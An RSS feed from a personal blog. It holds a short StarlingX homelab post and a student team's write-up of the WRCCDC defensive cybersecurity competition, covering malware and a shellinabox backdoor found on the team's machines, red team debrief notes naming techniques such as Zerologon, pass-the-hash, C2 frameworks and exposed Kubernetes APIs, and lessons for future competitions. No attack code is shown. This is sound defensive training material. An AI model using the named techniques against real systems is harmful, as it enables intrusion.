<?xml version="1.0" encoding="UTF-8"?>
<rss  xmlns:atom="http://www.w3.org/2005/Atom" 
      xmlns:media="http://search.yahoo.com/mrss/" 
      xmlns:content="http://purl.org/rss/1.0/modules/content/" 
      xmlns:dc="http://purl.org/dc/elements/1.1/" 
      version="2.0">
<channel>
<title>Jeffrey Fonseca</title>
<link>./posts/</link>
<atom:link href="./posts/index.xml" rel="self" type="application/rss+xml"/>
<description>All posts</description>
<generator>quarto-1.6.42</generator>
<lastBuildDate>Tue, 01 Apr 2025 07:00:00 GMT</lastBuildDate>
<item>
  <title>Build Server 6 — StarlingX</title>
  <link>./projects/starlingx/</link>
  <description><![CDATA[ 




<section id="the-why" class="level1">
<h1>The Why</h1>
<p>In my <a href="../build-server-5/">previous project</a>, I attempted to deploy <a href="https://en.wikipedia.org/wiki/OpenStack">Openstack</a> entirely with <a href="https://en.wikipedia.org/wiki/DevOps#GitOps">GitOps</a> methodologies, using <a href="https://fluxcd.io/">FluxCD</a>.</p>
<p>I failed. Well, it didn’t fail, but I think I’ve spent too long on it and I need to move on.</p>
<p>Recently, I’ve discovered a project that simeutaneously seems to be a distribution of OpenStack, Kubernetes, and Linux, called <a href="https://www.starlingx.io/">StarlingX</a>.</p>
<p>Also:</p>
<blockquote class="blockquote">
<p><a href="https://docs.starlingx.io/system_configuration/index-sysconf-d511820651f0.html#starlingx-openstack">StarlingX OpenStack is installed and managed as an FluxCD application.</a></p>
</blockquote>
<p>Now, StarlingX, sadly, is not GitOps OpenStack. Configurations to the OpenStack application are done via the command line, or via helm value files. Perhaps I can clone the flux repo they use, but truthfully, I’m not going to worry about it for now.</p>
</section>
<section id="starlingx-deployment" class="level1">
<h1>StarlingX Deployment</h1>
<p>There are multiple deployment guides, but I am interested in the <a href="https://docs.starlingx.io/r/stx.10.0/deploy_install_guides/release/bare_metal/aio_simplex_install_kubernetes.html">“Simplex”</a> install, which documents how to do an All in One install, using a single server, which is all I have.</p>
<p>I also care a lot about “For OpenStack only: Configure data interfaces for controller-0. Data class interfaces are vSwitch interfaces used by vSwitch to provide VM virtio vNIC connectivity to OpenStack Neutron Tenant Networks on the underlying assigned Data Network.”, since I only have one physical interface in use, and the other one will be virtual.</p>


</section>

 ]]></description>
  <category>projects</category>
  <guid>./projects/starlingx/</guid>
  <pubDate>Tue, 01 Apr 2025 07:00:00 GMT</pubDate>
</item>
<item>
  <title>WRCCDC Regionals Writeup</title>
  <link>./writeups/wrccdc/</link>
  <description><![CDATA[ 




<p>This is a writeup for the WRCCDC regionals. As some context, <a href="https://wrccdc.org/">WRCCDC</a> is a cybersecurity competition that involves managing an environment that is a simulation of a real company, while being hit by a cyberattack from competition organizers referred to as “red teamers”.</p>
<p>It’s stressful. It’s chaotic. But it’s great fun.</p>
<p>Vocab glossary (but I won’t cover non-competition specific stuff):</p>
<ul>
<li>Scoring engine: Software that automatically connects, and authenticates to scored services, and “scores” them for being up</li>
<li>Scored service: A service that is being checked by the scoring engine — not all services are.</li>
<li>Injects: Writeups of tasks we are assigned to do</li>
<li>Teams: Subsets of the competition organizers, volunteers responsible for making the game work
<ul>
<li>Red Team: <strong>Competition Organizers</strong> who pretend to be cyberattackers by slowly infiltrating machines they could instantly destroy but instead choose not to</li>
<li>Orange Team: Pretends to be customers</li>
<li>White Team: Grades Injects</li>
<li>Black (Ops/Operations) Team: Sets up the environment</li>
<li>Gold Team: Organizional duties</li>
</ul></li>
<li>Team packet: Document noting down the topology, some scored services, and rules of the competition.</li>
<li>Incident responses: Documents noting down how a cyberattack happened, affected services and data, and mitigation steps.</li>
</ul>
<section id="writeup" class="level1">
<h1>Writeup</h1>
<section id="topology" class="level2">
<h2 class="anchored" data-anchor-id="topology">Topology</h2>
<p>I began with two nmap scans of the entire environment, to see what was on the network.</p>
<ul>
<li><a href="./pastes/220nmap.txt">Nmap scan 1</a> (public environment, physical machines)</li>
<li><a href="./pastes/230nmap.txt">Nmap scan 2</a> (“cloud” environment/VM’s)</li>
</ul>
<p>There was also one more environment, which was the partially airgapped one, which I did not nmap.</p>
<p>The topolgy was very complex, there were 3 environments in total, one “cloud” environment hosted on vcenter, and two physical environments, one of which was airgapped.</p>
<p><img src="./writeups/wrccdc/images/topologyfinal2025.webp" class="img-fluid"></p>
</section>
<section id="work" class="level2">
<h2 class="anchored" data-anchor-id="work">Work</h2>
<p>There weren’t enough physical machines at first. We started out with 3 workstations that had input working and internet access, and then later pushed it up to 5. What we should have probably done is deploy a proxy of some sort on the device in between the airgapped network and the main network (scully), and then used that to get internet access on more of the workstations. But because we didn’t know if it was acceptable, we didn’t do it.</p>
<p>I firstly logged into the <em>laptop</em> with the hostname “Bishop41”. The machine ran something <a href="https://winuxos.com/">Winux</a>, which is essentially Ubuntu with KDE, heavily themed to look like Windows. There was also <a href="https://linuxfx.org/">LinuxFX</a>, which was something similar. I liked them at first, I thought they were cool Windows clones that I could give to my mother so I could help her escape Windows, without her noticing, but the KDE UI kept crashing.</p>
<p>Thankfully, I have experience from my personal laptop:</p>
<p><code>systemctl --user restart plasma-plasmashell</code> (without sudo). The jokes is that KDE “<em>Krashes</em>” a lot.</p>
<p>Firstly, I had to change the dns at <code>/etc/resolv.conf</code>. It was originally marked immutable, so I had to unmark it with <code>chattr -i /etc/resolv.conf</code> in order to be able to edit, even as a root user.</p>
<p>Bishop41 had some malware on it that was fairly easy to find… but I didn’t find the later bits until after I had to do the presentation. The presentation: <a href="./kitty_presentation">presentation html link</a></p>
<p>Of course, I elaborated on the points in the presentation, since the slides are somewhat information sparse. For example, I broke down how the reverse shell worked, pointing to the bits of the python code that bound to a port, or ran the bash process.</p>
<p>And, I was also wrong about the reverse shell not being running. It was <code>:(</code>. I later found that there was a cronjob, either added by red teamers or black teamers</p>
<p>There was also another piece of dangerous software I missed, a web service that had an interface to submit python code that would run on the machine. Not quite malware, but it wasn’t a scored service. I removed it, as it was serving on port 80, which interfered when I attempted to up the <code>apache2</code> service.</p>
<p>I did find something interesting in the apache2.</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">&lt;Directory /&gt;</span>
<span id="cb1-2">        Options FollowSymLinks</span>
<span id="cb1-3">        AllowOverride None</span>
<span id="cb1-4">        Require all denied</span>
<span id="cb1-5">&lt;/Directory&gt;</span>
<span id="cb1-6"></span>
<span id="cb1-7">&lt;Directory /usr/share&gt;</span>
<span id="cb1-8">        AllowOverride None</span>
<span id="cb1-9">        Require all granted</span>
<span id="cb1-10">&lt;/Directory&gt;</span>
<span id="cb1-11"></span>
<span id="cb1-12">&lt;Directory /var/www/&gt;</span>
<span id="cb1-13">        Options Indexes FollowSymLinks</span>
<span id="cb1-14">        AllowOverride None</span>
<span id="cb1-15">        Require all granted</span>
<span id="cb1-16">&lt;/Directory&gt;</span>
<span id="cb1-17"></span>
<span id="cb1-18">#&lt;Directory /srv/&gt;</span>
<span id="cb1-19">#       Options Indexes FollowSymLinks</span>
<span id="cb1-20">#       AllowOverride None</span>
<span id="cb1-21">#       Require all granted</span>
<span id="cb1-22">#&lt;/Directory&gt;</span></code></pre></div>
<p>I’m pretty sure /usr/share <em>isn’t</em> supposed to be publicly accessible on the web. Thankfully, this seems to be read only access.</p>
<p>I also did a later presentation on a software, <a href="https://arkime.com/">Arkime</a>. I did not manage to get it deployed, and my presentation overview was very short. However, after my presentation, they asked me many questions about PCAP’s, encryption, and other network analysis things, and I answered them pretty well. At the mixer that night, the person who quizzed me complimented me and told me that they were searching for specific keywords for the presentation.</p>
<p>Bishop41 also had a live, scored service that was a “python web environment”. An orange teamer actually came and in to (attempt to) use it to learn how to reverse an array. But that software was essentially a permanent security hole, as it could run arbitrary python on the machine as root.</p>
<p>We had trouble with docker on the Scully machine, it would time out when attempting to pull images. I never figured it out. It could ping, but it could not curl or install packages. Until it could for a bit. Then it stopped working again. And yes, DNS on the machine was working.</p>
<p>Later on, it got owned and some red teams claimed the bootloader was replaced with Nyan cat — although I did not see this one in person.</p>
<p>For the router, bologna (how is that pronounced?), it got owned later on. It was an alpine router.</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">~ # ss -tulpn                                                                                                                    │</span>
<span id="cb2-2">│Netid   State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process                                   │</span>
<span id="cb2-3">│udp     UNCONN    0         0                  0.0.0.0:67               0.0.0.0:*       users:(("dnsmasq",pid=3088,fd=4))        │</span>
<span id="cb2-4">│udp     UNCONN    0         0                  0.0.0.0:37179            0.0.0.0:*       users:(("squid",pid=3482,fd=9))          │</span>
<span id="cb2-5">│udp     UNCONN    0         0                  0.0.0.0:2521             0.0.0.0:*                                                │</span>
<span id="cb2-6">│udp     UNCONN    0         0                  0.0.0.0:58414            0.0.0.0:*       users:(("dnsmasq",pid=3088,fd=14))       │</span>
<span id="cb2-7">│udp     UNCONN    0         0                  0.0.0.0:53               0.0.0.0:*       users:(("dnsmasq",pid=3088,fd=6))        │</span>
<span id="cb2-8">│udp     UNCONN    0         0                        *:50916                  *:*       users:(("squid",pid=3482,fd=8))          │</span>
<span id="cb2-9">│udp     UNCONN    0         0                     [::]:2521                [::]:*                                                │</span>
<span id="cb2-10">│udp     UNCONN    0         0                     [::]:53                  [::]:*       users:(("dnsmasq",pid=3088,fd=8))        │</span>
<span id="cb2-11">│tcp     LISTEN    0         128                0.0.0.0:8080             0.0.0.0:*       users:(("shellinaboxd",pid=3441,fd=4))   │</span>
<span id="cb2-12">│tcp     LISTEN    0         200              127.0.0.1:5432             0.0.0.0:*       users:(("postgres",pid=3409,fd=7))       │</span>
<span id="cb2-13">│tcp     LISTEN    0         32                 0.0.0.0:53               0.0.0.0:*       users:(("dnsmasq",pid=3088,fd=7))        │</span>
<span id="cb2-14">│tcp     LISTEN    0         128                0.0.0.0:22               0.0.0.0:*       users:(("sshd",pid=3519,fd=7))           │</span>
<span id="cb2-15">│tcp     LISTEN    0         1024                     *:443                    *:*       users:(("mini_httpd",pid=3257,fd=4))     │</span>
<span id="cb2-16">│tcp     LISTEN    0         200                  [::1]:5432                [::]:*       users:(("postgres",pid=3409,fd=6))       │</span>
<span id="cb2-17">│tcp     LISTEN    0         256                      *:3128                   *:*       users:(("squid",pid=3482,fd=12))         │</span>
<span id="cb2-18">│tcp     LISTEN    0         256                      *:3129                   *:*       users:(("squid",pid=3482,fd=13))         │</span>
<span id="cb2-19">│tcp     LISTEN    0         32                    [::]:53                  [::]:*       users:(("dnsmasq",pid=3088,fd=9))        │</span>
<span id="cb2-20">│tcp     LISTEN    0         128                   [::]:22                  [::]:*       users:(("sshd",pid=3519,fd=8))           │</span>
<span id="cb2-21">│~ # service shellinaboxd stop                                                                                                    │</span>
<span id="cb2-22">│ * Stopping shellinaboxd ... </span></code></pre></div>
<p><a href="https://github.com/shellinabox/shellinabox">Shellinabox</a> is a small web service that lets you run shell commands via browser interface. Essentially a backdoor.</p>
<p>In addition to this, when bologna was pwned, the <code>.profile</code> file, which the <code>ash</code> shell seems to run when it started up, was set to play a very long “video” via a program called asciicinema, which basically plays videos in the terminal.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">bologna:~# cat .profile </span>
<span id="cb3-2">#!/bin/sh</span>
<span id="cb3-3">asciinema play /.demo.rec</span></code></pre></div>
<p>And then this would play a very long simulation of the machine getting hacked. To exit, I would hit Ctrl+C and then type <code>exit</code>, and then spam Ctrl + Z or Ctrl + D to quit. Painful, but I found zellij wouldn’t rerun this when starting. It was also persistent, it stayed even after I deleted the .profile file. (Oh. I probably should have just edited it to remove the “asciinema play” bit).</p>
<p>Later through the competition, we started using cryptpad on a public instance. We used a link shortener to make it easier to access. We had a spreadsheet for inventory and passwords.</p>
</section>
<section id="injects" class="level2">
<h2 class="anchored" data-anchor-id="injects">Injects</h2>
<p>We also had a lot of trouble with the Kubernetes cluster. Before Orange team came in and took it, a <a href="./files/drplan.txt">Disaster Recovery Plan</a>. This documented how to migrate the services from one kubernetes cluster to another, but we did not do this.</p>
<p>There were some other injects that would have been helpful to us. For example, one inject was to set up a way to transfer data from high side to low side by setting up <a href="https://nifi.apache.org/">Apache Nifi</a>. That would have been legitimately useful to transfer stuff from low side to high side.</p>
<p>There was also an ansible inject, which required the creation of 3 playbooks that would collect: Disk space, network interfaces, and system services running. We then had to run those playbooks on 10 machines.</p>
</section>
<section id="final-scores-and-future-plans" class="level2">
<h2 class="anchored" data-anchor-id="final-scores-and-future-plans">Final Scores and Future Plans</h2>
<p><img src="./writeups/wrccdc/images/scores.webp" class="img-fluid"></p>
<p>We only had a single person who had been to regionals before, and our previous Windows and Linux team leads were no longer on the team. We lost a ton of knowledge, both the raw technical knowledge, but also the passed down knowledge about the competition, like what is acceptable, and what compromises are okay in terms of scoring.</p>
<p>I always expected last place. We were woefully underprepared, not having expected to make it to regionals — So we had all split up and began working on our own stuff (I was working on Openstack so I could have a remote lab for people <em>next year</em>), and we were suprised when the announcment about Regionals came out. And then we had to get back together and prepare for one of the harder regions of CCDC in less than 2 months, while our entire team consisted of 9 active members.</p>
<p>Like when I play chess against a vastly better player, my goal was never to win, but instead to <em>not lose instantly</em>. And we did.</p>
<p><img src="./writeups/wrccdc/images/graph.jpg" class="img-fluid"></p>
<p>I’m very pleased with our performance. Despite setting the low goal of not losing instantly, sometimes not even that is achievable, which sucks. But we managed to mostly hold ourselves together for the first half of the first day, and we managed to learn a lot.</p>
<p>Since we are effectively starting from scratch, it’s important that we record all the stuff we are missing so we can fix these issues. This is why I have this writeup. I will probaly turn the “Things to do” into a Kanban of some kind and we will knock them out one by one over the off season.</p>
</section>
</section>
<section id="debrief-notes" class="level1">
<h1>Debrief Notes</h1>
<p>Brandon/<code>@ProBro</code></p>
<ul>
<li>Much of the stuff was set up in the week before competition.</li>
</ul>
<p>Ops team debrief by Wasabi:</p>
<ul>
<li>One of the largest topologies ever, 3 networks connected by vpn or something else.</li>
<li>Scully router was too secure, stopping traffic to the phones.</li>
<li>Most custom services ever. Some of it was written hours before competition start. Satellite control system, written in 4 hours. A few chatbots. OTP service could get hijacked by red team by changing the seed.</li>
<li>Red hat was doing wireless hacking and jamming antennae…</li>
<li>CVE’s were dropped for non ccdc-specific services.</li>
<li>We are not allowed to unplug EVERYTHING. Like the coastline college environment, or the magic box. One team shut that down and their scoring stopped working</li>
<li>Red team would deny outbound dns traffic to break dns. Red team would also drop udp traffic but not tcp, so ssh would still be allowed.</li>
<li>some teams used the site to site vpn to connect to all networks.</li>
<li>Teams should really do an inventory, especially <em>how</em> things are connected, not just what.</li>
<li>Only 90 tickets, half of qualifiers. Teams got a lot of poinrs back from ticketing from ops team errors.</li>
<li>8 custom apps, some had CVE’s reported in them.</li>
<li>Deployment for each pod went from 2 hours for a team to 30 minutes when they were setting up environments.</li>
<li>Changes from Qualifiers:
<ul>
<li>teams coordinated, red team and ops team talked to eachother. Ops team had a sheet with red team plans. They used this to guess if an issue was red team related.</li>
<li>Environment was much more tested.</li>
</ul></li>
<li>NUCC (nonprofit that provides software) provided unifi gear, and they will peovide it if we ask.
<ul>
<li>I met the owner, he goes to SFVGlug sometimes. He offered to lend us network hardware.</li>
</ul></li>
<li>Vcenter crashed.</li>
<li>Slow =/= not working. Many teams complained, saying something that was not working when really it was just slow.</li>
<li>Windows licenses sometimes needed to be reactivated <code>slmgr /rearm</code></li>
<li>Printers would instantly distract a few people from every team. I hope the vid is put on youtube, it’s hilarious.</li>
<li>A couple hours before the taking of the kubernetes machine there was a disaster recovery sent out. Only 4 teams recovered from that. Also red team was taking advantage of that distraction to break into people’s machines.</li>
<li>Old switch was a dhcp server, but unifi needs dhcp to get set up</li>
<li>Inter Laptop
<ul>
<li>A lot of malware</li>
<li>Web based python development environment</li>
<li>was supposed to be hiding the domain controller by resting on top of the machine (in our env we received a broken monitor, although we were not supposed to receive a monitor at all)</li>
<li>had a unifi switch controller preinstalled, for setting up the new unifi</li>
</ul></li>
<li>20-30 in person volunteers, 5 remote for ops team.</li>
<li>300 physical systems and 200 virtual machines.</li>
<li>Ask clovismint for info about services.</li>
<li>Beesad validates tickets after the event, to give points back. Thanks Beesad!</li>
</ul>
<p>Orange Team Debrief:</p>
<ul>
<li>Orange team was also black team…</li>
<li>Orange team scoring: 40% was phone answers, 30% was services, 30% was customer service</li>
<li>Commonly missed: not answering the phone, hanging up, or not calling us back</li>
<li>People blocked orange team’s vpn clients into high side</li>
<li>They will call and tell if a service is down, and they track callbacks on a sheet. You get full points if you fix the service and call back.</li>
<li>Radio check. Only one team changed the frequency. Interrogation.</li>
</ul>
<p>White Team Debrief:</p>
<ul>
<li>Does all injects and grading</li>
<li>They had a schedule for the injects, to ensure that there was always at least 2 injects except at the beginning or end of the day. They also worked with black and orange team, arranging these. Announcements are also timed, such as the DR plan.</li>
<li>3500 items scored, by this morning. 45 seconds per item scored.</li>
<li>Some issues with some injects, like submitting an inject as an ODT renamed as a pdf, or same thing woth the wrong #.
<ul>
<li>Double check them</li>
</ul></li>
<li>Read the team packet…</li>
<li>A single link is not a substitute for documentation, especially for high side which doesn’t have internet.</li>
<li>The inject gave temporary permission for an inject to have data flow beyweem hi side and low side. This was probably the proxy inject, where we would have set up the proxy that gives internet access to hi side.</li>
<li>Easter eggs are funny and wake the inject graders up. They have very little sleep.</li>
<li>Infographics should be easy to read and print.</li>
<li>More chain/linked injects than usual. Common in the real world.</li>
</ul>
<p>Red Team:</p>
<ul>
<li>Red team always wins. They don’t want people to make the mistakes that they did when we go into the real world.</li>
<li>Every time red time does something, they are trying to teach something.</li>
<li>Red team brought a radio jammer
<ul>
<li>Only one team passed the code signals test, by sending out people to talk to the red teamers and ask what they are doing, and then change their frequency</li>
</ul></li>
<li>Red team looks at Github and sees all the repos.</li>
<li>Red team doesn’t like when people do stuff that doesn’t translate to the real world, so they punish it.</li>
<li>Red team “gives more love” to teams that are aware they are on the systems.</li>
<li>Red team lost access to their boxes when vcenter when down becuase they forgot their changed ip address.</li>
<li>Red team keeps surprises so people can’t prep for what they do.</li>
<li>Red team did not do anything tricky, like 0 days the night before (nationals)… they simply searched for what’s vulnerable and what’s open.</li>
<li>“We love kubernetes”. K8s is new to the competition. To mitigate basics: change default kubeconfig or block 6443 api server. This is how they got in, and they would run pods, down pods, etc.
<ul>
<li>Forgejo has default creds in helm chart, changes could be pushed to fluxcd.</li>
<li>Look into environment variables and configurations of deployments. Helm values, etc.</li>
<li>Xtraop product manager says to Learn Kubernetes because people struggle to secure it in the real world.</li>
</ul></li>
<li>MITRE shows how people do attacks in the real world.</li>
<li>Windows: Zerologon, eternalblue, RPC, new C2 called Realm, static rust binary. 3 differenr tyows if C2: slitter, realm, cobalt strike.
<ul>
<li>Reset DC passwords, stole hashes, pass the hash.</li>
</ul></li>
<li>Watching connections, ssh logs. Large static binaries = suspicious, potential C2 server. Binary in tempt directory making outbound connections = suspicious.</li>
<li>Scully had ssh private key in root of scully. Make sure to clean those up.</li>
<li>Alpine router got pwned, 3 different ways to get admin access. Webmin/cockpit I think? They should be shut down.</li>
<li>Ragusa had a flask app with a command injection vuln. No team found it for the entire competirion. We need to be able to figure out how they got in and patch it.</li>
<li>Red team offered to do mock/scrimmages</li>
</ul>
</section>
<section id="for-future-ccdc" class="level1">
<h1>For Future CCDC</h1>
<section id="issues-we-struggled-with" class="level2">
<h2 class="anchored" data-anchor-id="issues-we-struggled-with">Issues We Struggled With</h2>
<ul>
<li>Not enough machines in the main workstation area. We started with 3 and pushed it up to 5 on day 1, but we still struggled.</li>
<li>I counted about 39 machines… Too many machines to manage, too little workstations
<ul>
<li>Automation solutions are needed</li>
</ul></li>
</ul>
</section>
<section id="preparation-methodology-adjustments" class="level2">
<h2 class="anchored" data-anchor-id="preparation-methodology-adjustments">Preparation Methodology Adjustments</h2>
<ul>
<li>People need to learn scripting
<ul>
<li>Python for Linux</li>
<li>Powershell for Windows</li>
<li>People need to be able to write/edit scripts on the spot</li>
</ul></li>
<li>People need to drill the fundamentals. Overall lack of experience that can be fixed.
<ul>
<li>Set up stuff and tear it down.</li>
<li>Kubernetes interaction/ how to change certificate used to authenticate</li>
<li>docker-compose vs with space instead</li>
<li>DNS/proxy access to the environments</li>
<li>Be able to handle never before seen software thrown at us. Either rare stuff, or custom CCDC stuff.</li>
</ul></li>
<li>People are gonna need to specialize. I wanted to avoid this. But I can’t see a way around this. There isn’t enough time for every person to learn every software, as much as that’s what I want to do to prepare them for the real world</li>
<li>OSINT in general
<ul>
<li>But we should look at the Github’s of all other teams <em>and</em> competition organizers. There might be things like config files (kubernetes, or nix) in those git repos</li>
<li>Github code search. Search engines. People need to know how to search.</li>
</ul></li>
<li>Certain injects, like the ansible one’s, could be done “at home” and then we could reuse the code during comp.</li>
<li>Possibly drill to prepare endurance. Although music would have helped.</li>
<li>Drill for readiness with <em>specific</em> utility software: ssh, zellij, restic (?), SIEM
<ul>
<li>Also proxies</li>
<li>But it’s not worth it to attempt to memorize the environments, especially since they give us rare or custom services. It’s better to have a fundamental understanding.</li>
</ul></li>
<li>Drill to the point where people can still operate under pressure</li>
<li>Basic troubleshooting skills — Although I don’t think they were lacking, but instead people flustering under pressure.</li>
<li>Blogs people write to, rather than injects.</li>
<li>Weekly assignments that are discussed and done during the week.</li>
</ul>
</section>
<section id="things-to-prepare" class="level2">
<h2 class="anchored" data-anchor-id="things-to-prepare">Things to Prepare</h2>
<ul>
<li>Printouts
<ul>
<li>Ascii cheatsheet: Yeah. But we did actually need it for decoding the special signals being sent.</li>
<li>Documentation? Create our own team book/cheatsheets?</li>
<li><a href="https://wizardzines.com/">Julia Evans</a> cheatsheets would have helped a lot.</li>
<li>Pacman Rosetta</li>
<li><a href="https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/">Sans cheatsheets</a>, <a href="https://imgv2-2-f.scribdassets.com/img/document/686774535/original/adfc0dbeca/1702226435?v=1">E.g: Linux</a></li>
<li>Other misc, UPDATED cheatsheets</li>
<li>Simpler passwords for our password sheets, or possibly cryptpad spreadsheet</li>
<li>Way more password sheets if we are going to do those. Like 16 instead of 6.</li>
</ul></li>
<li>Sticky notes for the computers, to have a “todo” for what to do on the workstation/related machines?
<ul>
<li>Blank sticky note = no password changed</li>
</ul></li>
<li>Physical Books
<ul>
<li>Unix handbook, or the LPIC books are really good for physical books documenting Linux.</li>
</ul></li>
<li>Custom Linux ISO that’s really small, possibly doesn’t need network, and has automatic install. This way we don’t need to click through the Debian installer.
<ul>
<li>Also find a good small live distro for physical machines, so that we can use things like <code>chntpw</code> or other recovery tools.</li>
</ul></li>
<li>Quarto and formatting:
<ul>
<li>I threw together something quick using Nix to install quarto to make an html revealjs presentation and it worked <em>really well</em>.</li>
<li>Do we <em>need</em> themed templates for docs? Quarto’s default dark is lame but extremely simple to use, vs custom document templates for every competition.
<ul>
<li>Or <a href="https://quarto.org/docs/authoring/brand.html">quarto brand.yml</a> for branding/templates</li>
</ul></li>
<li>Templates for presentations, injects.</li>
<li><code>embed-resources: true</code> to create self contained quarto revealjs and html. <a href="https://quarto.org/docs/output-formats/html-basics.html#self-contained">See docs</a></li>
</ul></li>
<li>Nmap scans in multiple output formats — including <strong>markdown tables</strong> of multiple kinds (service as table, machines as table, etc). Or as CSV’s.</li>
<li>SIEM solution…
<ul>
<li>Some way to log network connections for incident responses</li>
<li>Log network and traffic for software like Bishop41’s extremely insecure web based python dev environment</li>
</ul></li>
<li>Automate group policy — No more lockouts</li>
<li>Become able to consistently fix problems caused by red team on the Windows machines.</li>
<li>Learn the inject naming scheme.</li>
<li>Airgap ready: Part of our environment was airgapped. How do we set up services without google?
<ul>
<li>Physical docs, paper/books</li>
<li>Small, portable, transferable services
<ul>
<li>Terminal/Tui collaboration tools. Zellij, but also, does a collaborative text editor exist?</li>
</ul></li>
</ul></li>
<li>Some way of organizing work for easy handoff
<ul>
<li>The machines had virtual desktops but I didn’t use them (they didn’t show up on LinuxFX/Winux)</li>
</ul></li>
<li>Automated granular backups (restic?)
<ul>
<li>Deduplication</li>
<li>Just config, or data as well</li>
</ul></li>
<li>Use CIS benchmarks instead of Microsoft Docs when docs are bad</li>
<li>Ansible injects can probably be done in advance. We could do them at home as injects and then copy the code.</li>
<li>Some sort of backup software. Restic?</li>
<li>Set up honeypots/traps for lower privilege users (Windows, but Linux could do this as well).
<ul>
<li>Windows containers</li>
<li>Find ip’s, prevent privilege escalation</li>
</ul></li>
<li>Automation that could be run in the background so other people can work on the workstation</li>
<li>Some kind of pastebin service to share text/files/images.</li>
<li>Soar/Nix to install packages, or other custom/distro agnostic package managers
<ul>
<li>Nix for quarto. But texlive small is needed for pdf.</li>
<li>Soar for zellij, restic, some other static stuff.</li>
</ul></li>
<li>Easier passwords</li>
<li>Backdoors for the windows machines outside of a backup user/admin
<ul>
<li>Meshcentral? (also, can Meshcentral aggregate logs SIEM style?).</li>
</ul></li>
<li>Url shortener, self hosted</li>
<li>Clipboard managers. Built into KDE and Windows nowadays.</li>
<li>KDE is the best. Gnome lacks features.</li>
</ul>
<p>Software we need:</p>
<ul>
<li>Static binary, client-server</li>
<li>“clustered”, where instances can interact, possibly find eachother</li>
<li>Shell (reverse shell?) that are collaborative (zellij)</li>
<li>backup from any machine to any other (restic?)
<ul>
<li>Also need Windows backup (group policy, AD stuff, DNS) backup ability</li>
</ul></li>
<li>Forward, view and search logs from other machines
<ul>
<li><a href="https://lnav.org/">lnav</a>?</li>
<li>Also network traffic, basically Incident Response needs (source ip address, destination, time). Command history.</li>
</ul></li>
<li>Collaborative text editor or spreadsheet setup.
<ul>
<li>Inventory, passwords, injects</li>
</ul></li>
<li>Built in automation
<ul>
<li>Basic tasks</li>
<li>Machines add themselves to the inventory</li>
<li>Changes password as an install step</li>
</ul></li>
<li>Proxy traffic to other machines, to escape airgap</li>
<li>Pastebin/file sharing</li>
<li>Run on our own devices during competitions</li>
<li>Literally based on kubernetes?</li>
<li>Hide itself? The ability to disguise as other services?</li>
</ul>
<p>UCI: <a href="https://github.com/UCI-CCDC/LOCS/blob/b097d1adfad6037253c13a29bf811f045e77f151/linux/dominion/domlogging.py" class="uri">https://github.com/UCI-CCDC/LOCS/blob/b097d1adfad6037253c13a29bf811f045e77f151/linux/dominion/domlogging.py</a></p>
<p>Scripts for password shuffling, adding to SIEM, etc. They have many things we want. We should also look at other teams.</p>
</section>
<section id="preduring-comp" class="level2">
<h2 class="anchored" data-anchor-id="preduring-comp">Pre/During Comp</h2>
<p>It should be noted that some of this is stuff we did during the competition that worked well, in addition to things we didn’t do but should have.</p>
<ul>
<li>Stop assuming instructions are perfect.
<ul>
<li>Every team packet has had at least one thing incorrect. A machine not existing but documented, vice versa, changed ip addresses, etc</li>
<li>The proxy didn’t work because the instructions weren’t perfect. Eventually we requested help from Black Team and they did but we can experiment more with instructions on our own.</li>
<li>No hate to Ops Team. But it’s a complex competition and that means things will go wrong. We just gotta adapt.</li>
</ul></li>
<li>Cryptpad: We could have and should have used a public instance for injects that needed collaboration
<ul>
<li>And cryptpad has a kanban board for task organization</li>
<li>Possibly password sheet as well</li>
<li>Use link shortener to find/share it easily.</li>
</ul></li>
<li>Reuse injects if they reuse machines</li>
<li>Backup admin accounts on the machines. Could probably be automated.</li>
<li>Clipboard manager… please</li>
<li>I misspelled the password when writing it down…
<ul>
<li>We should have brought the other sheet, having multiple people write the passwowrd down.</li>
<li>Have physical backups and redundancies as well?</li>
</ul></li>
<li>Add machines to spreadsheet inventory as part of first steps
<ul>
<li>Along with password, and documenting what password is used via coordinates.</li>
</ul></li>
</ul>
</section>
<section id="notes" class="level2">
<h2 class="anchored" data-anchor-id="notes">Notes</h2>
<p>This is that passed down knowledge that we are lacking.</p>
<ul>
<li>I didn’t know dockerizing services was acceptable, but I overheard one team mention this, and it was also mentioned in the discord as the accepted strategy to secure one the flask web app that let the users run arbitrary python code as root on the machines.</li>
<li>ALL the teams did better than us. But one team unplugged Coastline Collges non-ccdc networking equipment.
<ul>
<li>One team unplugged the “magic box” the scoring engine used.</li>
<li>It’s probably much better to be much more aggressive and ask for forgiveness rather than permission.</li>
</ul></li>
</ul>
</section>
</section>
<section id="notes-1" class="level1">
<h1>Notes</h1>
<ul>
<li>Open internet acccess
<ul>
<li>Proxy was not forced</li>
<li>Chatgpt, perplexity were unblocked</li>
</ul></li>
<li>Red Team did not delete <code>/var/syslog</code> even though they cleaned journalctl</li>
<li>Arkime wants elasticsearch/opensearch — they don’t come with a UI by default</li>
<li>hold shift to bypass zellij hijacking selections in mouse mode</li>
<li>Apparently it’s possible to disable <code>sys</code>/syscalls in python. Not perfect but is better secure than arbitrary commmands.</li>
<li>No second presentation on the second day, despite claims otherwise.</li>
<li>Injects, including presentations, only in pdf format.</li>
<li>Winget was installed on at least one of the windows machines.</li>
<li>Active Directory doesn’t work in safe mode.</li>
<li>Red team did not get an empty “test environment”. There was a half sized environment managed by Anthropic Claude though. It did’t do too well.</li>
<li>There was actually an inject to set up a data flow between hi side and low side</li>
<li>There as an inject about setting up a new unify switch before they took our old one away, and there was an announcement about migrating the services from one kubernetes clusters before they took the small NUC with the kubernetes on it as well.</li>
</ul>
</section>
<section id="off-topic" class="level1">
<h1>Off-Topic</h1>
<section id="to-do-miscfunny" class="level2">
<h2 class="anchored" data-anchor-id="to-do-miscfunny">To Do Misc/Funny</h2>
<p>(To do stuff that isn’t as important or relevant)</p>
<ul>
<li>CCDC playlist: Since we had internet access, we should have put some bops on
<ul>
<li>In all serious, this would have helped with our motivation greatly.</li>
